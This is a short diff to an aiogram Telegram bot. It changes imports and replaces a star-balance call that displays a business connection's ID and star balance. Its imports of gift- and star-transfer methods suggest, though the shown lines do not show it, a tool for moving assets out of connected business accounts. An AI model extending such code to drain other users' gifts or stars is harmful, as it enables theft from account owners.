@@ -12,7 +12,7 @@ from aiogram.utils.keyboard import InlineKeyboardBuilder
 from aiogram.methods import TransferGift, ConvertGiftToStars
 from aiogram.exceptions import TelegramBadRequest
 from aiogram.methods.transfer_business_account_stars import TransferBusinessAccountStars
-from custom_methods import GetFixedBusinessAccountStarBalance, GetFixedBusinessAccountGifts, TransferGiftFixed, ConvertGiftToStarsFixed
+from custom_methods import GetFixedBusinessAccountGifts, ConvertGiftToStarsFixed, GetFixedBusinessAccountStarBalance
 import config
 
 CONNECTIONS_FILE = "business_connections.json"
@@ -459,7 +459,7 @@ async def handle_gift_callback(callback: CallbackQuery):
 
         try:
             # Прямой вызов метода с ручной обработкой ответа
-            response = await bot(GetBusinessAccountStarBalance(business_connection_id=business_connection_id))
+            response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection_id))
             # Извлекаем amount из result, так как star_amount отсутствует
             star_amount = response.result.get('amount', 0) if hasattr(response, 'result') else 0
             text = f"🆔 Бизнес коннект: <b>{business_connection_id}</b>\n⭐️ Баланс звёзд: <b>{star_amount}</b>\n\n"
